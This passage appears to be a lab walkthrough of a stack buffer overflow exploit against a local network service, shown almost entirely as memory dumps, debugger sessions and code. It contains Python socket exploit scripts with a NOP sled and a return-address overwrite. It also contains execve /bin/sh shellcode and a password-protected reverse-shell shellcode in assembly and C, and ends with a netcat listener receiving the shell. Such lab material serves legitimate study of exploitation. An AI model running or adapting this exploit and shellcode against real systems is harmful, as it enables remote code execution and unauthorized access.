0x7fffffffdb98  0x67413167 0x33674132 0x41346741 0x67413567  g1Ag2Ag3Ag4Ag5Ag
0x7fffffffdba8  0x37674136 0x41386741 0x68413967 0x31684130  6Ag7Ag8Ag9Ah0Ah1
0x7fffffffdbb8  0x41326841 0x68413368 0x35684134 0x41366841  Ah2Ah3Ah4Ah5Ah6A
0x7fffffffdbc8  0x68413768 0x39684138 0x41306941 0x69413169  h7Ah8Ah9Ai0Ai1Ai
0x7fffffffdbd8  0x33694132 0x41346941 0x69413569 0x37694136  2Ai3Ai4Ai5Ai6Ai7
0x7fffffffdbe8  0x41386941 0x6a413969 0x316a4130 0x41326a41  Ai8Ai9Aj0Aj1Aj2A
0x7fffffffdbf8  0x6a41336a 0x356a4134 0x41366a41 0x6a41376a  j3Aj4Aj5Aj6Aj7Aj
0x7fffffffdc08  0x396a4138 0x41306b41 0x6b41316b 0x336b4132  8Aj9Ak0Ak1Ak2Ak3
0x7fffffffdc18  0x41346b41 0x6b41356b 0x376b4136 0x41386b41  Ak4Ak5Ak6Ak7Ak8A
0x7fffffffdc28  0x6c41396b 0x316c4130 0x41326c41 0x6c41336c  k9Al0Al1Al2Al3Al
0x7fffffffdc38  0x356c4134 0x41366c41 0x6c41376c             4Al5Al6Al7Al
```

```
lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 0x37674136
Pattern 0x37674136 first occurrence at position 200 in pattern.

lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 0x6241376241366241
Pattern 0x6241376241366241 first occurrence at position 48 in pattern.
```

```
from struct import pack
import socket
import sys

rip = 0x7fffffffdba8

payload = b"\x41"*48 + b"\x90"*8 + b"B"*8 + b"\x90"*170 + b"\xCC"*200 +b"\x90"*800 

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('127.0.0.1',8081))
s.send(payload)

s.close()
```


```
[0x555555554b3d]> dr
rax = 0x41414141
rbx = 0x00000000
rcx = 0x7ffff7a98650
rdx = 0x00000059
r8 = 0x00000000
r9 = 0x00000000
r10 = 0x00000000
r11 = 0x7ffff7b912c0
r12 = 0x5555555549b0
r13 = 0x7fffffffe0b0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x5555555552a0
rdi = 0x7fffffffdae0
rsp = 0x7fffffffdb18
rbp = 0x9090909090909090
rip = 0x555555554b3d
rflags = 0x00010286
orax = 0xffffffffffffffff
[0x555555554b3d]> pxw @ rsp
0x7fffffffdb18  0x42424242 0x42424242 0x90909090 0x90909090  BBBBBBBB........
0x7fffffffdb28  0x90909090 0x90909090 0x90909090 0x90909090  ................
0x7fffffffdb38  0x90909090 0x90909090 0x90909090 0x90909090  ................
0x7fffffffdb48  0x90909090 0x90909090 0x90909090 0x90909090  ................
0x7fffffffdb58  0x90909090 0x90909090 0x90909090 0x90909090  ................
0x7fffffffdb68  0x90909090 0x90909090 0x90909090 0x90909090  ................
0x7fffffffdb78  0x90909090 0x90909090 0x90909090 0x90909090  ................
0x7fffffffdb88  0x90909090 0x90909090 0x90909090 0x90909090  ................
0x7fffffffdb98  0x90909090 0x90909090 0x90909090 0x90909090  ................
0x7fffffffdba8  0x90909090 0x90909090 0x90909090 0x90909090  ................
0x7fffffffdbb8  0x90909090 0x90909090 0x90909090 0x90909090  ................
0x7fffffffdbc8  0xcccc9090 0xcccccccc 0xcccccccc 0xcccccccc  ................
0x7fffffffdbd8  0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc  ................
0x7fffffffdbe8  0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc  ................
0x7fffffffdbf8  0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc  ................
```

``` 
rip = 0x7fffffffdba8

payload = b"\x41"*48 + b"\x90"*8 + pack("<Q", rip) + b"\x90"*170 + b"\xCC"*200 +b"\x90"*800 
```


```
[0x7ffff7dd4090]> dc
Waiting for connections...
Got connection!
[0x7fffffffdc1b]> 

[0x7fffffffdc1b]> pd 10
            ;-- rip:
            0x7fffffffdc1b      cc             int3
            0x7fffffffdc1c      cc             int3
            0x7fffffffdc1d      cc             int3
            0x7fffffffdc1e      cc             int3
            0x7fffffffdc1f      cc             int3
            0x7fffffffdc20      cc             int3
            0x7fffffffdc21      cc             int3
            0x7fffffffdc22      cc             int3
            0x7fffffffdc23      cc             int3
            0x7fffffffdc24      cc             int3
[0x7fffffffdc1b]> 
```


```
0000000000400080 <_start>:
  400080:	50                   	push   %rax
  400081:	48 31 d2             	xor    %rdx,%rdx
  400084:	48 31 f6             	xor    %rsi,%rsi
  400087:	48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx
  40008e:	2f 73 68 
  400091:	53                   	push   %rbx
  400092:	54                   	push   %rsp
  400093:	5f                   	pop    %rdi
  400094:	b0 3b                	mov    $0x3b,%al
  400096:	0f 05                	syscall

\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
```

```
[0x7fffffffdc13]> ds
[0x7fffffffdc13]> pd 10
            0x7fffffffdc13      cc             int3
            0x7fffffffdc14      cc             int3
            0x7fffffffdc15      cc             int3
            0x7fffffffdc16      cc             int3
            0x7fffffffdc17      cc             int3
            0x7fffffffdc18      cc             int3
            ;-- rip:
            0x7fffffffdc19      cc             int3
            0x7fffffffdc1a      50             push rax
            0x7fffffffdc1b      4831d2         xor rdx, rdx
            0x7fffffffdc1e      4831f6         xor rsi, rsi
[0x7fffffffdc13]> 
```

```
0:  6a 29                  push   0x29
   2:  58                     pop    rax
   3:  6a 02                  push   0x2
   5:  5f                     pop    rdi
   6:  6a 01                  push   0x1
   8:  5e                     pop    rsi
   9:  99                     cdq    
   a:  0f 05                  syscall 
   c:  50                     push   rax
   d:  5f                     pop    rdi
   e:  52                     push   rdx
   f:  68 7f 01 01 01         push   0x101017f
  14:  66 68 11 5c            pushw  0x5c11
  18:  66 6a 02               pushw  0x2
  1b:  6a 2a                  push   0x2a
  1d:  58                     pop    rax
  1e:  54                     push   rsp
  1f:  5e                     pop    rsi
  20:  6a 10                  push   0x10
  22:  5a                     pop    rdx
  23:  0f 05                  syscall 
  25:  6a 02                  push   0x2
  27:  5e                     pop    rsi
  28:  6a 21                  push   0x21
  2a:  58                     pop    rax
  2b:  0f 05                  syscall 
  2d:  48 ff ce               dec    rsi
  30:  79 f6                  jns    28 <loop_1>
  32:  6a 01                  push   0x1
  34:  58                     pop    rax
  35:  49 b9 50 61 73 73 77   movabs r9,0x203a647773736150
  3c:  64 3a 20 
  3f:  41 51                  push   r9
  41:  54                     push   rsp
  42:  5e                     pop    rsi
  43:  6a 08                  push   0x8
  45:  5a                     pop    rdx
  46:  0f 05                  syscall 
  48:  48 31 c0               xor    rax,rax
  4b:  48 83 c6 08            add    rsi,0x8
  4f:  0f 05                  syscall 
  51:  48 b8 31 32 33 34 35   movabs rax,0x3837363534333231
  58:  36 37 38 
  5b:  56                     push   rsi
  5c:  5f                     pop    rdi
  5d:  48 af                  scas   rax,QWORD PTR es:[rdi]
  5f:  75 1a                  jne    7b <exit_program>
  61:  6a 3b                  push   0x3b
  63:  58                     pop    rax
  64:  99                     cdq    
  65:  52                     push   rdx
  66:  48 bb 2f 62 69 6e 2f   movabs rbx,0x68732f2f6e69622f
  6d:  2f 73 68 
  70:  53                     push   rbx
  71:  54                     push   rsp
  72:  5f                     pop    rdi
  73:  52                     push   rdx
  74:  54                     push   rsp
  75:  5a                     pop    rdx
  76:  57                     push   rdi
  77:  54                     push   rsp
  78:  5e                     pop    rsi
  79:  0f 05                  syscall 
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";

void main()
{
  printf("ShellCode Length: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();

```

```
from struct import pack
import socket
import sys


rip = 0x7fffffffdba8

sc = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
revshell = b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x0 ...

payload = b"\x41"*48 + b"\x90"*8 + pack("<Q", rip) + b"\x90"*162 + b"\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC" + revshell +b"\x90"*800 

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('127.0.0.1',8081))
s.send(payload)

s.close()

```





```
[0x7fffffffdc13]> pd 10
            ;-- rip:
            0x7fffffffdc13      cc             int3
            0x7fffffffdc14      cc             int3
            0x7fffffffdc15      cc             int3
            0x7fffffffdc16      cc             int3
            0x7fffffffdc17      cc             int3
            0x7fffffffdc18      cc             int3
            0x7fffffffdc19      cc             int3
            0x7fffffffdc1a      6a29           push 0x29               ; ')' ; section_end..comment
            0x7fffffffdc1c      58             pop rax
            0x7fffffffdc1d      6a02           push 2                  ; 2
[0x7fffffffdc13]> pd 20
            ;-- rip:
            0x7fffffffdc13      cc             int3
            0x7fffffffdc14      cc             int3
            0x7fffffffdc15      cc             int3
            0x7fffffffdc16      cc             int3
            0x7fffffffdc17      cc             int3
            0x7fffffffdc18      cc             int3
            0x7fffffffdc19      cc             int3
            0x7fffffffdc1a      6a29           push 0x29               ; ')' ; section_end..comment
            0x7fffffffdc1c      58             pop rax
            0x7fffffffdc1d      6a02           push 2                  ; 2
            0x7fffffffdc1f      5f             pop rdi
            0x7fffffffdc20      6a01           push 1                  ; 1
            0x7fffffffdc22      5e             pop rsi
            0x7fffffffdc23      99             cdq
            0x7fffffffdc24      0f05           syscall
            0x7fffffffdc26      50             push rax
            0x7fffffffdc27      5f             pop rdi
```



```
^V^Clab@lab-VirtualBox:~/exploit-pattern$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from localhost 49124 received!
Passwd: 12345678
ls
ls -lah
ps
pwd
Descargas
Documentos
Escritorio
Imágenes
Música
Plantillas
```



